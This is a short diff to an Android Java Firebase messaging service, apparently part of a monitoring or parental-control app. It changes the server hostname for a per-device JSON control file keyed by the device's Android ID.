@@ -70,7 +70,7 @@ public class GuardianMessagingService extends FirebaseMessagingService {
 
                     @SuppressLint("HardwareIds")
                     String token = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
-                    String url = "https://digiserve25.pythonanywhere.com/control/" + token + ".json";
+                    String url = "https://digiserve.pythonanywhere.com/control/" + token + ".json";
 
                     try {
                         JSONObject response = NetworkUtils.getJsonFromUrl(url, context);
